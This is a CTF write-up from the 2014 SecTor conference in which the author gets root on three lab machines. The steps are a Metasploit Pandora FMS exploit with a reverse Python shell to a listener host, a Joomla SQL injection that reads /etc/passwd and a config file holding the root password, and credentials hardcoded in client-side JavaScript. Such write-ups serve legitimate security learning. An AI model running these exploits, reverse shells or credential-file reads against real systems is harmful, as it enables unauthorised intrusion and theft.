### Solved by superkojiman

[SecTor](http://sector.ca) is an annual security conference held in Toronto. When I heard that the CTF would be back, I signed the team up under our old monicker buhnluv (VulnHub backwards). There was a minimum of 2 players per team, and a maximum of 5. I was initially going to be tackling the challenges with palor from #vulnhub and his co-worker, but unfortunately they were called into work and so I was on my own. 

The CTF was 5 hours long, with 8 machines to hack into. The goal was to get root, read the flag, and submit it for the points. Within the first hour, someone without a team asked to play and was put on my team. [Jason](https://twitter.com/inuk_x) sat with me through the entire game and hacked one of the targets and scored us some points. Another fellow, whose name I unfortunately didn't get, joined us later on and also got one of the boxes and pushed us up in the scoreboard.

Due to the time constraint, I was unable to take proper notes and screenshots for this writeup. I managed to hack into four of the eight targets, one of which I took no notes on. So I'll writeup what I can while it's still fresh in my mind. I also don't remember how many points were allocated to each challenge. The lowest was 200, and the highest I got was 700. One of the teams who got root on the targets would change the flag, and so when we tried to submit it when we hacked in, it got rejected. We had to wait for the admin to verify we had root and give us the points. Because of this, some of the flags I list here may not be correct, but the procedure to get root should be accurate. 


### 192.168.101.13

This target was running a vulnerable version of Pandora FMS that was vulnerable to remote code execution. Getting a shell on the target was easily done using Metasploit's pandora_fms_exec module and a reverse python shell:


```
msf exploit(pandora_fms_exec) > show options

Module options (exploit/linux/http/pandora_fms_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        Use a proxy chain
   RHOST      192.168.101.13   yes       The target address
   RPORT      8023             yes       The target port
   TARGETURI  /                yes       The base path to the Pandora instance
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  92.168.101.121   yes       The listen address
   LPORT  443              yes       The listen port
   SHELL  /bin/bash        yes       The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   Pandora 5.0RC1
```

This exploit actually attempts to escalate to root privileges on its own, and it did a fine job of it:

```
msf exploit(pandora_fms_exec) > exploit

[*] Started reverse handler on 192.168.101.121:443
[*] 192.168.101.13:8023 - Sending payload
[*] 192.168.101.13:8023 - Trying to escalate privileges to root

bash-4.1$ trap '' HUP
bash-4.1$ python -c 'import pty;pty.spawn("/bin/sh")'
sh-4.1$ su - artica
sudo -s
-bash-4.1$ sudo -s
[root@els4 artica]# cat /root/flag.txt
flag_8903789f930f9b824c5968381cd885bb
```

### 192.168.101.20

This target was running a version of Joomla that was vulnerable to SQL inection. Once again, Metasploit to the rescue with auxiliary module joomla_weblinks_sqli. 

```
msf auxiliary(joomla_weblinks_sqli) > show options

Module options (auxiliary/gather/joomla_weblinks_sqli):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CATEGORYID  0                yes       The category ID to use in the SQL injection
   FILEPATH    /etc/passwd      yes       The filepath to read on the server
   Proxies                      no        Use a proxy chain
   RHOST       192.168.101.20   yes       The target address
   RPORT       80               yes       The target port
   TARGETURI   /                yes       Base Joomla directory path
   VHOST                        no        HTTP server virtual host
```

Running the initial test returned the contents of /etc/passwd. After a bit of enumeration, I found /var/www/html/configuration.php which contained the root password:

```php
<?php
class JConfig {
    public $offline = '0';
    public $offline_message = 'This site is down for maintenance.<br /> Please check back again soon.';
    public $display_offline_message = '1';
    public $offline_image = '';
    public $sitename = 'Quick Go Sports';
    public $editor = 'tinymce';
    public $captcha = '0';
    public $list_limit = '20';
    public $access = '1';
    public $debug = '0';
    public $debug_lang = '0';
    public $dbtype = 'mysqli';
    public $host = 'localhost';
    public $user = 'root';
    public $password = 'J2o5gU4gCyc5hXr';
```

SSH was enabled on this target, so I logged in as root with the password J2o5gU4gCyc5hXr and was able to read the flag. 

### 192.168.101.25

Navigating to http://192.168.101.25 showed a login form that gave the user the ability to read the contents of index.php. Looking at the page's source code referenced a JavaScript file admin/auth.js. The contets of this file contained the admin user's login credentials:

```javascript
function login(){
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        if(username == 'admin' && password == '@dm1ni$trat0r'){
                document.getElementById('data').innerHTML = "<p>Login Successful!</p>";
                showFile();
        }else {
                document.getElementById('data').innerHTML = "<p>Login Failed!</p>";
        }
}
```

Once I was able to authenticate, I could read any file, like /etc/passwd

![](/images/2014/sector/01.png)

Interestingly, the root password was not shadowed. I was able to crack it using john, which revealed the password as 1234567890. From here I logged in as root via SSH and got the flag:

```text
# ssh root@192.168.101.25
The authenticity of host '192.168.101.25 (192.168.101.25)' can't be established.
RSA key fingerprint is d8:c9:78:07:6d:42:1c:bd:12:cc:33:07:cf:36:d3:d6.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.101.25' (RSA) to the list of known hosts.
1234567890

root@192.168.101.25's password:
Last login: Tue Oct 21 07:06:34 2014 from 192.168.101.106
[root@elw6 ~]# ls
flag.txt
[root@elw6 ~]# cat flag.txt
flag_b96d6f9d438e2cfe6e659abd69e102441
```

### Final thoughts
SecTor CTF was a lot of fun, and I'm pleased with how we did. I was close to scoring a 5th box, but ran out of time. In the end, we placed at second: 

![](/images/2014/sector/02.png) 

I'm annoyed that I didn't take more detailed notes, but at the time, I was just rushing to get as many points as possible. Thanks to Jason and the other fellow who helped out, it was much appreciated! Next year I'll be more mindful about taking notes and perhaps 2015's writeup won't be quite so sparse. 

